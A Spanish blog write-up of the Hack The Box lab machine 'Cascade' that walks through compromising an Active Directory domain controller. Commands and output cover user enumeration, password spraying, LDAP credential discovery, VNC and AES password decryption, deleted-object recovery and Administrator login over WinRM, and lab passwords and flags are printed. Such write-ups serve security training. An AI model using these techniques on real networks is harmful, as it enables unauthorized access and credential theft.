---
layout: post
title: Cascade
date: 2023-02-07
description:
img:
fig-caption:
tags: [OSCP, OSED]
---
___

<center><img src="/writeups/assets/img/Cascade-htb/Cascade_banner.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos

* Enumeración por RPC

* Enumeración de Usuarios por Kerberos

* ASPRepRoast Attack (Fallido)

* Enumeración por SMB

* Enumeración por LDAP

* Kerberoasting Attack (Fallido)

* Análisis de archivo EXE

* Reto criptográfico

* Abuso del grupo AD Recycle Bin

***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.10.182 -oG openports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-08 16:04 GMT
Nmap scan report for 10.10.10.182
Host is up (0.17s latency).
Not shown: 65520 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
49154/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown
49170/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 41.24 seconds
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p53,88,135,139,389,445,636,3268,3269,5985,49154,49155,49157,49158,49170 10.10.10.182 -oN portscan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-08 16:05 GMT
Nmap scan report for 10.10.10.182
Host is up (0.28s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-02-08 16:05:51Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49170/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -1s
| smb2-time: 
|   date: 2023-02-08T16:06:49
|_  start_date: 2023-02-08T16:00:38
| smb2-security-mode: 
|   210: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 111.78 seconds
```

## Puerto 445 (SMB)

Con crackmapexec aplico un escaneo para ver dominio, hostname y versiones

```null
crackmapexec smb 10.10.10.182
SMB         10.10.10.182    445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
```

Agrego ```cascade.local``` al /etc/hosts

Intento listar los recursos compartidos

```null
smbmap -H 10.10.10.182 -u 'null'
[!] Authentication error on 10.10.10.182
```

Pero no tengo acceso

## Puerto 43 (DNS)

Como tengo un dominio puedo tratar de efectuar un ataque de transferencia de zona y encontrar subdominios

```null
dig @10.10.10.182 cascade.local axfr

; <<>> DiG 9.18.8-1-Debian <<>> @10.10.10.182 cascade.local axfr
; (1 server found)
;; global options: +cmd
; Transfer failed.
```

Pero falla. Aplico consultas a los name services y servidores de correo

```null
dig @10.10.10.182 cascade.local ns

; <<>> DiG 9.18.8-1-Debian <<>> @10.10.10.182 cascade.local ns
; (1 server found)
;; global options: +cmd
;; Got answer:
;; WARNING: .local is reserved for Multicast DNS
;; You are currently testing what happens when an mDNS query is leaked to DNS
;; ->>HEADER<<- opcode: QUERY, status: FORMERR, id: 50477
;; flags: qr rd; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 1
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 1232
; COOKIE: a991071695bab58b (echoed)
;; QUESTION SECTION:
;cascade.local.			IN	NS

;; Query time: 40 msec
;; SERVER: 10.10.10.182#53(10.10.10.182) (UDP)
;; WHEN: Wed Feb 08 16:10:

dig @10.10.10.182 cascade.local mx

; <<>> DiG 9.18.8-1-Debian <<>> @10.10.10.182 cascade.local mx
; (1 server found)
;; global options: +cmd
;; Got answer:
;; WARNING: .local is reserved for Multicast DNS
;; You are currently testing what happens when an mDNS query is leaked to DNS
;; ->>HEADER<<- opcode: QUERY, status: FORMERR, id: 18547
;; flags: qr rd; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 1
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 1232
; COOKIE: bdd33778042db741 (echoed)
;; QUESTION SECTION:
;cascade.local.			IN	MX

;; Query time: 324 msec
;; SERVER: 10.10.10.182#53(10.10.10.182) (UDP)
;; WHEN: Wed Feb 08 16:10:54 GMT 2023
;; MSG SIZE  rcvd: 54
```

No obtengo nada relevante

## Puerto 135 (RPC)

Con rpcclient puedo listar los usuarios haciendo uso de un null session

```null
rpcclient -U "" 10.10.10.182 -N -c 'enumdomusers' | grep -oP '\[.*?\]' | tr -d '[]' | grep -v x
CascGuest
arksvc
s.smith
r.thompson
util
j.wakefield
s.hickson
j.goodhand
a.turnbull
e.crowe
b.hanson
d.burman
BackupSvc
j.allen
i.croft
```

Los valido por Kerberos

```null
kerbrute userenum -d cascade.local --dc 10.10.10.182 users

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 02/08/23 - Ronnie Flathers @ropnop

2023/02/08 16:27:06 >  Using KDC(s):
2023/02/08 16:27:06 >  	10.10.10.182:88

2023/02/08 16:27:12 >  [+] VALID USERNAME:	j.goodhand@cascade.local
2023/02/08 16:27:12 >  [+] VALID USERNAME:	a.turnbull@cascade.local
2023/02/08 16:27:12 >  [+] VALID USERNAME:	util@cascade.local
2023/02/08 16:27:12 >  [+] VALID USERNAME:	r.thompson@cascade.local
2023/02/08 16:27:12 >  [+] VALID USERNAME:	s.hickson@cascade.local
2023/02/08 16:27:12 >  [+] VALID USERNAME:	s.smith@cascade.local
2023/02/08 16:27:12 >  [+] VALID USERNAME:	arksvc@cascade.local
2023/02/08 16:27:12 >  [+] VALID USERNAME:	j.wakefield@cascade.local
2023/02/08 16:27:18 >  [+] VALID USERNAME:	j.allen@cascade.local
2023/02/08 16:27:18 >  [+] VALID USERNAME:	d.burman@cascade.local
2023/02/08 16:27:18 >  [+] VALID USERNAME:	BackupSvc@cascade.local
2023/02/08 16:27:18 >  Done! Tested 15 usernames (11 valid) in 11.908 seconds
```

Los almaceno en un nuevo diccionario

Intento realizar un ASPRepRoast Attack, pero todos requieren de autenticación previa de Kerberos

```null
GetNPUsers.py cascade.local/ -no-pass -usersfile valid_users
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] User j.goodhand doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User a.turnbull doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User util doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User r.thompson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User s.hickson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User s.smith doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User arksvc doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j.wakefield doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j.allen doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User d.burman doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User BackupSvc doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Listo los grupos existentes

```null
rpcclient -U "" 10.10.10.182 -N
rpcclient $> enumdomgroups
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Group Policy Creator Owners] rid:[0x208]
group:[DnsUpdateProxy] rid:[0x44f]
```

Extraigo información para cada usuario y lo exporto en un archivo

```null
rpcclient -U "" 10.10.10.182 -N -c 'enumdomusers' | grep -oP '\[.*?\]' | tr -d '[]' | grep  x > rids
for rid in $(cat rids); do rpcclient -U "" 10.10.10.182 -N -c "queryuser $rid"; done > usersenum
```

Destaca que todos los usuarios tengan un LogonScript, llamado MapAuditDrive.vbs

Efectúo un Password Spraying, utilizando el mismo diccionario de usuarios como contraseñas

```null
crackmapexec smb 10.10.10.182 -u valid_users -p valid_users | grep -v "-"
```

Ninguna es válida


## Puerto 389 (LDAP)

No tengo credenciales válidas pero puedo extraer los namingcontexts

```null
ldapsearch -H ldap://10.10.10.182:389/ -x -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingContexts: DC=cascade,DC=local
namingContexts: CN=Configuration,DC=cascade,DC=local
namingContexts: CN=Schema,CN=Configuration,DC=cascade,DC=local
namingContexts: DC=DomainDnsZones,DC=cascade,DC=local
namingContexts: DC=ForestDnsZones,DC=cascade,DC=local

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

Y extraigo mucha información

```null
ldapsearch -x -H ldap://10.10.10.182:389/ -b "DC=cascade,DC=local" > ldapenum
```

Veo un recurso compartido, correspondiente al grupo Audit Share

```null
description: \\Casc-DC1\Audit$
```

De todo la captura, filtro por el SPN de cada usuario. Para r.thomson hay un campo con una contraseña en base64

```null
userPrincipalName: r.thompson@cascade.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
dSCorePropagationData: 20200126183918.0Z
dSCorePropagationData: 20200119174753.0Z
dSCorePropagationData: 20200119174719.0Z
dSCorePropagationData: 20200119174508.0Z
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 132294360317419816
msDS-SupportedEncryptionTypes: 0
cascadeLegacyPwd: clk0bjVldmE=
```

Y es válida

```null
crackmapexec smb 10.10.10.182 -u 'r.thompson' -p 'rY4n5eva' | grep "+"
SMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\r.thompson:rY4n5eva 
```

Utilizo ```ldapdomaindump``` para dumpear datos y estructurarlos por tablas

```null
ldapdomaindump -u 'cascade.local\r.thompson' -p 'rY4n5eva' 10.10.10.182
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```

Me monto un servicio HTTP con python y visualizo los datos desde el navegador

Dos usuarios pertenecen al grupo Remote Management Users

<img src="/writeups/assets/img/Cascade-htb/1.png" alt="">

El usuario ArkSvc pertenece a AD Recycle Bin, lo que significa que tiene acceso a recursos que han sido borrados

<img src="/writeups/assets/img/Cascade-htb/2.png" alt="">

Pruebo un Kerberoasting Attack, pero no es el caso

```null
GetUserSPNs.py cascade.local/r.thompson:rY4n5eva
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

No entries found!
```

Ahora ya puedo listar los recursos compartidos

```null
smbmap -H 10.10.10.182 -u 'r.thompson' -p 'rY4n5eva'
[+] IP: 10.10.10.182:445	Name: cascade.local                                     
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	Audit$                                            	NO ACCESS	
	C$                                                	NO ACCESS	Default share
	Data                                              	READ ONLY	
	IPC$                                              	NO ACCESS	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	print$                                            	READ ONLY	Printer Drivers
	SYSVOL                                            	READ ONLY	Logon server share 
```

Listo los subdirectorios para Data

```null
smbmap -H 10.10.10.182 -u 'r.thompson' -p 'rY4n5eva' -r 'Data'
[+] IP: 10.10.10.182:445	Name: cascade.local                                     
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	Data                                              	READ ONLY	
	.\Data\*
	dr--r--r--                0 Tue Jan 28 22:05:51 2020	.
	dr--r--r--                0 Tue Jan 28 22:05:51 2020	..
	dr--r--r--                0 Mon Jan 13 01:45:14 2020	Contractors
	dr--r--r--                0 Mon Jan 13 01:45:10 2020	Finance
	dr--r--r--                0 Tue Jan 28 18:04:51 2020	IT
	dr--r--r--                0 Mon Jan 13 01:45:20 2020	Production
	dr--r--r--                0 Mon Jan 13 01:45:16 2020	Temps
```

Creo una montura en mi equipo para trabajar más comodamente

```null
mount -t cifs //10.10.10.182/Data /mnt/Cascade -o username=r.thompson,password=rY4n5eva,domain=cascade.local,rw
```

Ahora puedo ver los recursos de forma estructurada

```null
tree
.
├── Contractors
├── Finance
├── IT
│   ├── Email Archives
│   │   └── Meeting_Notes_June_2018.html
│   ├── LogonAudit
│   ├── Logs
│   │   ├── Ark AD Recycle Bin
│   │   │   └── ArkAdRecycleBin.log
│   │   └── DCs
│   │       └── dcdiag.log
│   └── Temp
│       ├── r.thompson
│       └── s.smith
│           └── VNC Install.reg
├── Production
└── Temps

13 directories, 4 files
```

Hay una nota en HTML. La abro con el Firefox y veo lo siguiente:

<img src="/writeups/assets/img/Cascade-htb/3.png" alt="">

Resumiendo el contenido, hay una cuenta temporal que ha sido borrada y su contraseña es la misma que la del usuario Administrador

Encuentro un registro de Windows

```null
cd ./IT/Temp/s.smith
ls
VNC Install.reg
file VNC\ Install.reg
VNC Install.reg: Windows Registry little-endian text (Win2K or above)
```

Tiene un campo con una contraseña en hexadecimal

```null
"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
```

Pero al hacerle el proceso inverso no se ve en texto claro

```null
echo '6b,cf,2a,4b,6e,5a,ca,0f' | tr -d ',' | xxd -ps -r; echo
k*KnZ
```

En Github hay una herramienta para descifrar la clave

```null
git clone https://github.com/jeroennijhof/vncpwd
cd vncpwd
make

echo '6b,cf,2a,4b,6e,5a,ca,0f' | tr -d ',' | xxd -ps -r > password
./vncpwd password
Password: sT333ve2
```

Esa contraseña se reutiliza para un usuario

```null
crackmapexec smb 10.10.10.182 -u valid_users -p 'sT333ve2' | grep "+"
SMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\s.smith:sT333ve2 
```

Había visto que pertenece al grupo Remote Management Users, así que me puedo conectar por winrm

Y gano acceso al sistema

```null
evil-winrm -i 10.10.10.182 -u 's.smith' -p 'sT333ve2'

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\s.smith\Documents>
```

Puedo visualizar la primera flag

```null
*Evil-WinRM* PS C:\Users\s.smith\Desktop> type user.txt
bc5dbc3a71e6158f70b16a8b5f7d196f
```

# Escalada

Este usuario pertenece al grupo Audit Share, y por tanto, puedo acceder al recurso que vi antes por LDAP

```null
*Evil-WinRM* PS C:\Users> net localgroup "Audit Share"
Alias name     Audit Share
Comment        \\Casc-DC1\Audit$

Members

-------------------------------------------------------------------------------
s.smith
The command completed successfully.
```

Creo una unidad lógica sincronizada con ese recurso para acceder a su contenido

```null
*Evil-WinRM* PS C:\Users> net use x: \\Casc-DC1\Audit$
The command completed successfully.

*Evil-WinRM* PS C:\Users> dir x:\


    Directory: x:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        1/28/2020   9:40 PM                DB
d-----        1/26/2020  10:25 PM                x64
d-----        1/26/2020  10:25 PM                x86
-a----        1/28/2020   9:46 PM          13312 CascAudit.exe
-a----        1/29/2020   6:00 PM          12288 CascCrypto.dll
-a----        1/28/2020  11:29 PM             45 RunAudit.bat
-a----       10/27/2019   6:38 AM         363520 System.Data.SQLite.dll
-a----       10/27/2019   6:38 AM         186880 System.Data.SQLite.EF6.dll
```

Creo una nueva montura en mi equipo para acceder a ese recurso

```null
mkdir /mnt/Cascade2
mount -t cifs //10.10.10.182/Audit$ /mnt/Cascade2 -o username=s.smith,password=sT333ve2,domain=cascade.local,rw
```

Dentro hay varios binarios de Windows

```null
ls
CascAudit.exe CascCrypto.dll DB RunAudit.bat System.Data.SQLite.dll System.Data.SQLite.EF6.dll x64 x86
```

Copio todo a mi equipo para tenerlo en local

```null
cp -r * /home/rubbx/Desktop/HTB/Machines/Cascade/prives
```

Dentro hay una base de datos SLQLite3

```null
cd DB
ls
Audit.db
file Audit.db
Audit.db: SQLite 3.x database, last written using SQLite version 3027002, file counter 60, database pages 6, 1st free page 6, free pages 1, cookie 0x4b, schema 4, UTF-8, version-valid-for 60
```

Enumero sus tablas y columnas

```null
sqlite3 Audit.db
SQLite version 3.40.0 2022-11-16 12:10:08
Enter ".help" for usage hints.
sqlite> .tables
sqlite> select * from Ldap;
1|ArkSvc|BQO5l5Kj9MdErXx6Q6AGOw==|cascade.local
```

Encuentro una contraseña, pero no está en texto claro

```null
echo BQO5l5Kj9MdErXx6Q6AGOw== | base64 -d; echo
D|zC;
```

Al listar las cadenas de caracteres imprimibles del binario EXE, encuentro la clave en texto claro, c4scadek3y654321

```null
strings -e l CascAudit.exe | sort -u
```

Transfiero todos los archivos a una máquina Windows para empezar a decompilar. En DNSpy encuentro la función que encripta la contraseña

<img src="/writeups/assets/img/Cascade-htb/4.png" alt="">

Abro la función que se encargar de la encriptación y aparece el IV hardcodeado, se está empleando cifrado AES

<img src="/writeups/assets/img/Cascade-htb/5.png" alt="">

En la función aes se puede ver el tipo de cifrado que está utilizando

<img src="/writeups/assets/img/Cascade-htb/6.png" alt="">

Introduzco todos los valores en CyberChef y me devuelve el valor de la contraseña en texto claro. La contraseña es la que vi en la base de datos

<img src="/writeups/assets/img/Cascade-htb/7.png" alt="">

La valido con crackmapexec

```null
crackmapexec smb 10.10.10.182 -u 'Arksvc' -p 'w3lc0meFr31nd'
SMB         10.10.10.182    445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\Arksvc:w3lc0meFr31nd 
```

Y me conecto por winrm

```null
evil-winrm -i 10.10.10.182 -u 'Arksvc' -p 'w3lc0meFr31nd'

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\arksvc\Documents> 
```

Este usuario pertenece a AD Recycle Bin, por lo que puedo restaurar la cuenta temporal (TempAdmin) que fue eliminada según la nota que leí antes

```null
*Evil-WinRM* PS C:\Users\arksvc\Documents> Get-ADObject -ldapFilter:"(msDS-LastKnownRDN=*)" -IncludeDeletedObjects | Select Name

Name
----
CASC-WS1...
Scheduled Tasks...
{A403B701-A528-4685-A816-FDEE32BDDCBA}...
Machine...
User...
TempAdmin...
```

Efectivamente, aparece como cuenta eliminada. Muestro las propiedades de todos los objetos y en un campo está su contraseña en base64

```null
cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
```

Le hago un decode para tenerla en texto claro

```null
echo YmFDVDNyMWFOMDBkbGVz | base64 -d; echo
baCT3r1aN00dles
```

La valido para el usuario Administrador

```null
crackmapexec smb 10.10.10.182 -u 'Administrator' -p 'baCT3r1aN00dles'
SMB         10.10.10.182    445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\Administrator:baCT3r1aN00dles (Pwn3d!)
```

Me conecto por winrm y puedo visualizar la segunda flag

```null
evil-winrm -i 10.10.10.182 -u 'Administrator' -p 'baCT3r1aN00dles'

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\Administrator\Desktop\root.txt
3f560e35b215934b112a0e3ade5f169e
```